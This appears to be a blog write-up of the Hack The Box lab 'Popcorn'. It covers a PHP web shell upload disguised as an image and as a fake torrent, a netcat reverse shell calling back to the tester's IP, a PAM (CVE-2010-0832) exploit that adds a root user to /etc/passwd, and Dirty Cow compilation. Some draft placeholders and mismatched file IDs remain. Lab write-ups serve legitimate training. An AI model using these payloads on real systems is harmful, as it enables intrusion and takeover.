---
layout: post
title:  "Hack The Box - Popcorn - Writeup"
date:   2000-01-01 07:00:00 +0200
tags: ["Hack The Box","OSWE"]
---
{% assign imgDir="HTB-Popcorn-Writeup" %}

# Introduction
The hack the box machine "Popcorn" is a medium machine which is included in [TJnull's OSWE Preparation List](https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=665299979). Acquiring an initial shell as `www-data` on this machine requires knowledge in the areas diretory brute forcing, file upload filter bypassing and PHP web shells. In addition, there is a second approach which requires knowledge of how `.torrent` files are structured. The privilege escalation requires knowledge in the aeras of PAM or Kernel Exploitation.

<img style="Width:550px;" src="/assets/{{ imgDir }}/card.png" alt="BlockyCard">

By enumerating the target, it is possible to discover that port 80 is open. Then, by bruteforcing directories on port 80, one can find `/rename` and `/torrent` which contain a file renaming API and a torrent hosting web site respectively. By navigating to http://10.10.10.6/torrent it is possible to find a login form which allows for sign ups. Once signed up, it is possible to upload torrents to the web server. The first way to achieve remote code execution is to upload a legitimate torrent, navigate to its description, change the image of the torrent to a fake image which contains a reverse shell payload in php, change the extension fo the image from `.png` to `.php` and navigate to the php file to trigger the execution of the script. 

The second approach is to bypass the filter for torrent uploads by uploading a fake torrent which contain a reverse shell payload in php. The fake torrents extension can then be changed with the `rename` api and it is then possible to achieve remote code execution as performed for the first approach. Once an initial shell as `www-data` data has been obtained, the privilege escalation can be performed either through [CVE-2010-0832](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0832) or with Dirty Cow. The next two sections show how to obtain remote code execution using the two approaches. Then, the two subsequent sections show the two ways to perform a privilege escalation from `www-data` to `root`.

# Exploitation
We start by performing an nmap scan by executing `nmap -sS -sC -sV -p- 10.10.10.85`. The `-sS` `-sC` and `-sV` flags instructs nmap to perform a SYN scan to identify open ports followed by a script and version scan on the ports which were identified as open. The `-p-` flag instructs nmap to scan all the ports on the target. From the scan results, shown below, we can see that port 22 and 80 are open. These ports correspond to SSH and HTTP respectively. 

![nmap](/assets/{{ imgDir }}/nmap.png)

As SSH is normally a dead end, we start by investigating port 80. if we visit [http://10.10.10.6](http://10.10.10.6) in a browser, we are greeted with the index page below.

![index](/assets/{{ imgDir }}/index.png)

As this index page doesn't provide us with much interesting information, we proceed by performing directory bruteforcing. This can be performed using `ffuf` as shown below. The `-u` and `-w` flag specify a URL to brute force and a wordlist respectively. Note that the `FUZZ` keyword in the URL specifies what part of the URL we want to fuzz and that the `-ic` flag is used to ignore comments in the wordlist.

{% highlight none linenos %}
┌──(kali㉿kali)-[~]
└─$ ffuf -u http://10.10.10.6/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -ic
[...]
                        [Status: 200, Size: 177, Words: 22, Lines: 5]
index                   [Status: 200, Size: 177, Words: 22, Lines: 5]
test                    [Status: 200, Size: 47065, Words: 2465, Lines: 651]
torrent                 [Status: 301, Size: 310, Words: 20, Lines: 10]
rename                  [Status: 301, Size: 309, Words: 20, Lines: 10]
                        [Status: 200, Size: 177, Words: 22, Lines: 5]
:: Progress: [220547/220547] :: Job [1/1] :: 1025 req/sec :: Duration: [0:03:35] :: Errors: 1 ::
{% endhighlight %}

By visiting the `/test` page, we discover that it is a phpinfo page. This page contains infromation about PHP and how PHP is configured. The next page `/torrent`, leads us to the a torrenting page shown in the first image below. The final page is `/rename` which results in an api for renaming files, shown in the second image below. Since we know that the web application uses php and that we can rename potentially arbitrary files on the system, we should be able to get remote code execution on the host if we can just find a way to upload arbitrary php code.

![torrent](/assets/{{ imgDir }}/torrent.png)

![rename](/assets/{{ imgDir }}/rename.png)

The torrent page appears to be used for sharing `.torrent` files. This type of files are used for peer-to-peer(file sharing) file sharing and are bencoded(link). If we try to click the upload button on the torrent page, we discover that we need to login before we can upload any torrents. We can however, click the browse button and see a file which was uploaded by the `Admin` user. We can, however, not edit this file. By 

![torrentBrowse](/assets/{{ imgDir }}/torrentBrowse.png)

![torrentBrowse2](/assets/{{ imgDir }}/torrentBrowse2.png)

Something interesting on the torrent page is the `Sign up` button. If we click this button, we reach a registration form. Submitting it with the values shown below (all `x` except for the code) leads to a new account named "x" being created and us automatically being logged in.

![signUp](/assets/{{ imgDir }}/signUp.png)

![signUp2](/assets/{{ imgDir }}/signUp2.png)

![Upload](/assets/{{ imgDir }}/upload.png)

I tried uploading a php reverse shell payload but couldn't evade the filter without changing the content of the uploaded file. At this point, there are two ways to get remote code execution. In the next subsection, we'll cover the easier way to do it. After that subsection, there is a subsection detailing how remote code execution can be obtained using the slightly harder approach.

## Initial Shell - Uploading a Malicious Image
If we try to upload a real torrent file, the upload is successful and we are redirected to a page which represents the uploaded torrent. It is possible to find a [legitimate torrent](https://kali.download/base-images/kali-2021.3/kali-linux-2021.3a-installer-amd64.iso.torrent) file to upload on the [Kali Linux website](https://www.kali.org/get-kali/), among other websites. Once a torrent file has been uploaded, we reach the page shown below. Here, we can click the "Edit this torrent" button to bring up a web page where we can upload an image.

![torrentPagePicture](/assets/{{ imgDir }}/torrentPagePicture.png)

![uploadTorrentImage](/assets/{{ imgDir }}/uploadTorrentImage.png)

After sending a couple of different requests, we can conclude that the website appears to be accept images with arbitrary content as long as the extension is valid extension for images (Such as `png`, `jpg` e.t.c). As such, we create a file named "webShell.png" with the content below, and upload it.

{% highlight python linenos %}
<?php
$cmd = ($_REQUEST['cmd']);
system($cmd);
?>
{% endhighlight %}

![image404](/assets/{{ imgDir }}/image404.png)

Next, we need to find where out malicious image was uploaded. If we hover over the new image with the mouse cursor, it is possible to see that it links to its location on the web server `http://10.10.10.6/torrent/upload/eb2af9670237f53152c68317b252bf49403ce545.png`. The next thing we need to do is to change the extension of this file to `.php`. If we visit the URL `http://10.10.10.6/rename/index.php?filename=/x&newfilename=/x` we get the response shown below, which leaks the web root of the web application. 

![webRootLeak](/assets/{{ imgDir }}/webRootLeak.png)

In this response, we see that `/var/www` is the root directory of the web application. As such, the fulle path to the malicious png file should be `/var/www/torrent/upload/eb2af9670237f53152c68317b252bf49403ce545.png`. As such, we can visit `http://10.10.10.6/rename/index.php?filename=/var/www/torrent/upload/eb2af9670237f53152c68317b252bf49403ce545.png&newfilename=/var/www/torrent/upload/eb2af9670237f53152c68317b252bf49403ce545.php` to change its extension to `.php`. Upon visiting the URL, the web server responds with the message `OK!` indicating that it successfully renamed the file. If we navigate to `http://10.10.10.6/torrent/upload/eb2af9670237f53152c68317b252bf49403ce545.php?cmd=id`, as shown below, we can see that we do indeed have code execution on the target!

![phprce1](/assets/{{ imgDir }}/phprce1.png)

{% highlight none linenos %}
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.3 443 >/tmp/f
{% endhighlight %}

To get a shell on the host, we start a netcat listener by executing `nc -lvnp 443` and then execute the reverse shell payload above by visiting the link `/torrent/upload/eb2af9670237f53152c68317b252bf49403ce545.php?cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|sh+-i+2>%261|nc+10.10.16.3+443+>/tmp/f` (Note that you have to change the IP address in the reverse shell payload to your own IP address for this to work). Upon visiting the link, the listener receives a connection which provides us with a shell on the host, as can be seen below.

![shell1](/assets/{{ imgDir }}/shell1.png)

The next step is to perform a privilege escalation from `www-data` to `root`. There are two ways to do this. The first way is to abuse a known vulnerability in Linux PAM and the second is through kernel exploitation. These two approches are detailed in the two sections after the next subsection. Feel free to skip the next subsection if you rather focus on getting a shell as `root` than to explore the second approach for acheiving remote code execution.

## Initial Shell - Bypassing the Torrent Filter
The starting point for this section is that we have found the torrent page http://10.10.10.6/torrent and that we have created an account with the username `x` and the password `x` as [described earlier](). The upload page is shown below. This upload page expects a torrent file and won't let a user upload anything without first inspecting the content of the file being uploaded. Torrent files are noramlly bencoded. 

(Explain bencoding)

We could try to upload a php web shell. We start by storing the content below in a file named "evil.torrent". This file contains a random integer `2` which is bencoded and a php web shell payload.

{% highlight python linenos %}
i2e
<?php
$cmd = ($_REQUEST['cmd']);
system($cmd);
?>
{% endhighlight %}

Next, we press the `Browse` button, select the file, press "OK" and type the name "evil". This creates the form shown below.

![uploadEvilTorrent](/assets/{{ imgDir }}/uploadEvilTorrent.png)

![uploadedEvilTorrent](/assets/{{ imgDir }}/uploadedEvilTorrent.png)

After pressing `Upload Torrent`, we are redirected to the URL `http://10.10.10.6/torrent/torrents.php?mode=details&id=b44b82a4bc6c35f6ad5e9fceefef9509c17fba74` which shows us the uploaded torrent as shown above. This means that the web application thought that this was a legitimate torrent file and that we successfully bypassed the filter! From the URL, we also obtain the ID value `b44b82a4bc6c35f6ad5e9fceefef9509c17fba74` which supposedly corresponds to our torrent. The next step is to find the uploaded file.

{% highlight none linenos %}
kali@kali:/tmp/x$ ffuf -u http://10.10.10.6/torrent/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -ic
[...]
rss                     [Status: 200, Size: 2419, Words: 124, Lines: 61]
download                [Status: 200, Size: 0, Words: 1, Lines: 1]
images                  [Status: 301, Size: 317, Words: 20, Lines: 10]
index                   [Status: 200, Size: 11356, Words: 1103, Lines: 294]
                        [Status: 200, Size: 11356, Words: 1103, Lines: 294]
login                   [Status: 200, Size: 8371, Words: 769, Lines: 228]
templates               [Status: 301, Size: 320, Words: 20, Lines: 10]
users                   [Status: 301, Size: 316, Words: 20, Lines: 10]
admin                   [Status: 301, Size: 316, Words: 20, Lines: 10]
health                  [Status: 301, Size: 317, Words: 20, Lines: 10]
browse                  [Status: 200, Size: 9278, Words: 794, Lines: 186]
comment                 [Status: 200, Size: 936, Words: 83, Lines: 17]
upload                  [Status: 301, Size: 317, Words: 20, Lines: 10]
css                     [Status: 301, Size: 314, Words: 20, Lines: 10]
edit                    [Status: 200, Size: 0, Words: 1, Lines: 1]
lib                     [Status: 301, Size: 314, Words: 20, Lines: 10]
database                [Status: 301, Size: 319, Words: 20, Lines: 10]
secure                  [Status: 200, Size: 4, Words: 1, Lines: 3]
js                      [Status: 301, Size: 313, Words: 20, Lines: 10]
logout                  [Status: 200, Size: 182, Words: 11, Lines: 1]
config                  [Status: 200, Size: 0, Words: 1, Lines: 1]
preview                 [Status: 200, Size: 27029, Words: 128, Lines: 138]
readme                  [Status: 301, Size: 317, Words: 20, Lines: 10]
thumbnail               [Status: 200, Size: 1748, Words: 21, Lines: 11]
torrents                [Status: 301, Size: 319, Words: 20, Lines: 10]
validator               [Status: 200, Size: 0, Words: 1, Lines: 1]
hide                    [Status: 200, Size: 3765, Words: 194, Lines: 135]
PNG                     [Status: 301, Size: 314, Words: 20, Lines: 10]
                        [Status: 200, Size: 11356, Words: 1103, Lines: 294]
:: Progress: [220547/220547] :: Job [1/1] :: 993 req/sec :: Duration: [0:03:42] :: Errors: 0 ::
{% endhighlight %}
We start by searching for upload directories through ffuf. As can be seen above, there are a lot of results. However, we can suspect that the file file is either in the `torrents` or `uploads` directory since these names seems like places where you would put a torrent file.

We could try to visit x and x, however these URLs just lead to "404 Not Found" pages. At this points, we can suspect that the file name is wrong, that the extension is wrong or that we are looking in the wrong directory. If we assume that the directory and file name is correct, we can write a script which tries to guess the correct extension. This script can be written in python as shown below.

{% highlight python linenos %}
import requests, sys, time

filename = "b44b82a4bc6c35f6ad5e9fceefef9509c17fba74" #CHANGE THIS
directory = "torrents"                                      #CHANGE THIS

#Obtain a session cookie for a logged in user
data = {"username":"x","password":"x"}
r = requests.post("http://10.10.10.6/torrent/login.php", data=data, allow_redirects=False)
sessionCookie = r.headers["Set-Cookie"].split(";")[0]
headers = {"Cookie":""+sessionCookie}

#Generate extensions
validChars= "abcdefghijklmnopqrstuvwxyz"
extensions = [i+j+k for i in validChars for j in validChars for k in validChars]

#Brute force extensions
startTime = time.time()
for extension in extensions:
    elTime = str(int(time.time() - startTime))
    print("Extension: '%s'. Elapsed time: %s seconds." % (extension,elTime), end="\r")

    URL = "http://10.10.10.6/torrent/"+directory+"/"+filename+"."+extension
    r = requests.get(URL)
    if r.status_code != 404:
        print("Found URL: " + URL)
        print("The URL was found in %s seconds" % int(time.time() - startTime))
        sys.exit(0)
{% endhighlight %}

Note that we log in since we don't know if we need to be authenticated to access the file.

This code.. TODO: Explain

If we run the code, we get the following output.

The author might have chosen to save torrent files with the extension `.btf` since "BTF" is an abbreviation for "bit torrent file". It is, however, not a commen file extension.

Note: On my machine, this script would take approximately 12 minutes to find a random extension. Since the extension started with one of the first characters in the alphabet, it only took 81 seconds. 

![foundEvilTorrent](/assets/{{ imgDir }}/foundEvilTorrent.png)

By visiting http://10.10.10.6/torrent/torrents/eb2af9670237f53152c68317b252bf49403ce545.btf we can see the content of the evil torrent file we submitted. However, the php code is not being executed. As such, we need to somehow modify the file extension of the script.

Earlier, we discovered an api for renaming files. We can use this api to change the file extension of this file. This can be done by visiting the URL
`http://10.10.10.6/rename/index.php?filename=/var/www/torrent/torrents/b44b82a4bc6c35f6ad5e9fceefef9509c17fba74.btf&newfilename=/var/www/torrent/torrents/b44b82a4bc6c35f6ad5e9fceefef9509c17fba74.php`

![bonusId](/assets/{{ imgDir }}/bonusId.png)

Upon visiting the URL, we get the message "OK!", suggesting that the renaming operation was successful. Then, we can execute code by visiting 
`http://10.10.10.6/torrent/torrents/b44b82a4bc6c35f6ad5e9fceefef9509c17fba74.php?cmd=[command]` where `[command]`. At this point, we can get a shell on the host with the netcat reverse shell payload shown earlier. Note the i2e does not go away.

The next step is to perform a privilege escalation from `www-data` to `root`. There are two ways to do this. The first way is to abuse a known vulnerability in Linux PAM and the second is through kernel exploitation, as we'll see in the next two sections.

# Privilege Escalation - Linux PAM
Linux [Pluggable Authentication Modules](https://en.wikipedia.org/wiki/Linux_PAM) (PAM) is a set of libraries that can be used to configure authentication of users in a centralized manner. It makes it possible to separate authentication mechanisms from source code by allowing the configuration of these mechanisms through config files. PAM can for example be used to check if a user account is valid, authenticate a user or enforce the usage of strong passwords. 

We can search for PAM among the list of installed packages by executing the command `dpkg -l | grep pam`. The output of the command, displayed below, state that version `1.1.0-2ubuntu1` of `libpam-modules` is being used. By executing `lsb_release -a` it is possible to see that OS of the target is `Ubuntu 9.10`. Using this particular version of `libpam-modules` on `Ubuntu 9.10` makes the host vulnerable to [CVE-2010-0832](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0832) which has an exploit available on [ExploitDB](https://www.exploit-db.com/exploits/14273). The content of this exploit is shown below. By reading the exploit, we can see that the only relevant part is line 11 `ln -sf $1 $HOME/.cache` where the exploit creates a symbolic link from the `.cache` directory in a users home directory, to a file we want to change permissions for. From the code, and from [Mitre](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0832), it is evident that the file which we create a symbolic link to will be owned by our user the next time we log in. 

{% highlight bash linenos %}
if [ $# -eq 0 ]; then
    echo "Usage: $0 /path/to/file"
    exit 1
fi

mkdir $HOME/backup 2> /dev/null
tmpdir=$(mktemp -d --tmpdir=$HOME/backup/)
mv $HOME/.cache/ $tmpdir 2> /dev/null
echo "\n@@@ File before tampering ...\n"
ls -l $1
ln -sf $1 $HOME/.cache
echo "\n@@@ Now log back into your shell (or re-ssh) to make PAM call vulnerable MOTD code :)  File will then be owned by your user.  Try /etc/passwd...\n"
{% endhighlight %}

Next, we proceed to delete the existing directory `/var/www/.cache` by executing `rm -r /var/www/.cache`, as demonstrated in the image below. Then, we execute `ln -sf /etc/passwd /var/www/.cache` to create a symbolic link to the `/etc/passwd` file.

ls -l /var/www/.cache
rm -r /var/www/.cache
ln -sf /etc/passwd /var/www/.cache
ls -l /var/www/.cache

To exploit the vulnerability, we now need to somehow log in as the `www-data` user. Earlier we saw that SSH is running on port 22. If we set up SSH for the `www-data` user, we can log in as this user and exploit the vulnerability to take ownership of the `/etc/passwd` file. To setup SSH for the `www-data` user, we start by executing `ssh-keygen` to generate a SSH key pair. Then, we execute `cp /var/www/.ssh/id_rsa.pub /var/www/.ssh/authorized_keys` to ensure that the private key `id_rsa` can be used to login to the host over SSH. Next, we base64 encode the private key `id_rsa` by executing `cat /var/www/.ssh/id_rsa | base64 -w0`. We copy the output of the command and place it at it `[x]` in the command `echo '[x]' | base64 -d > id_rsa`. Then, we change the permissions of the private key by executing `chmod 600 ./id_rsa` and log in as the `www-data` user by executing `ssh -i ./id_rsa www-data@10.10.10.6`.

ssh-keygen
cp /var/www/.ssh/id_rsa.pub /var/www/.ssh/authorized_keys
cat /var/www/.ssh/id_rsa | base64 -w0
echo '[base64]' | base64 -d > id_rsa
chmod 600 ./id_rsa
ssh -i ./id_rsa www-data@10.10.10.6

<!-- $1$CauwiL81$RVCASCR/bjV7Ls3c8fBpP/ -->
As can be seen in the image below, this changes the ownership of the `/etc/passwd` file. We proceed to generate a password hash for the password hash by executing `openssl passwd -1 hacked`. Then, we use this password hash to create a second `root` user by exeuting `echo 'root2:$1$CauwiL81$RVCASCR/bjV7Ls3c8fBpP/:0:0:pwned:/root:/bin/bash' >> /etc/passwd`. We can use the `su` command to switch to this new user. We do, however, first need to upgrade our shell. This can be done with python by executing `python -c "import pty; pty.spawn('/bin/bash')"`. Once we have upgraded our shell, we execute `su root2` and provide the password "hacked". This provides us with `root` privileges on the target!

openssl passwd -1 hacked
echo 'root2:$1$CauwiL81$RVCASCR/bjV7Ls3c8fBpP/:0:0:pwned:/root:/bin/bash' >> /etc/passwd
python -c "import pty; pty.spawn('/bin/bash')"
su root2
id

[createRoot2]


# Privilege Escalation - Kernel Exploitation
By executing the command `uname -r`, it is possible to obtain the Kernel version on Linux-based systems. In this particular case, executing the command results in the output `2.6.31-14-generic-pae`. If we search for kernel exploits for this kernel version using searchsploit, we can find the well-known "Dirty Cow" exploit. 

![searchsploit](/assets/{{ imgDir }}/searchsploit.png)

As can be seen above, there are a couple of available exploits. We will proceed with `40839.c` as this is an exploit which has worked well in the past. We copy this exploit to the current directory and save it with the name "dirty.c". Then, we start a python web server to serve this file to the target host.

![copyKE](/assets/{{ imgDir }}/copyKE.png)

<!--
searchsploit -p linux/local/40839.c
cp /usr/share/exploitdb/exploits/linux/local/40838.c dirty.c

python3 -m http.server 80

wget http://10.10.16.3/dirty.c
gcc -pthread dirty.c -o dirty -lcrypt
./dirty hacked
-->

![runKE](/assets/{{ imgDir }}/runKE.png)

Next, we download the kernel exploit from our host to the target machine using `wget` as shown above. We then compile the exploit with `gcc` by executing `gcc -pthread dirty.c -o dirty -lcrypt`. This command can be found in the comments of the exploit file's source code. We then exeucute `./dirty hacked`. This creates a new `root` user named `firefart` which has the password `hacked`. We can see this by checking the content of the `/etc/passwd` file, as shown below.

![firefartCreated](/assets/{{ imgDir }}/firefartCreated.png)

![sufirefart](/assets/{{ imgDir }}/sufirefart.png)

We can use the `su` command to switch to this new user. We do, however, first need to upgrade our shell. This can be done with python by executing `python -c "import pty; pty.spawn('/bin/bash')"`. Once we have upgraded our shell, we execute `su firefart` and provide the password "hacked" which we chose earlier. As shown in the picture above, this provides us with `root` privileges on the target!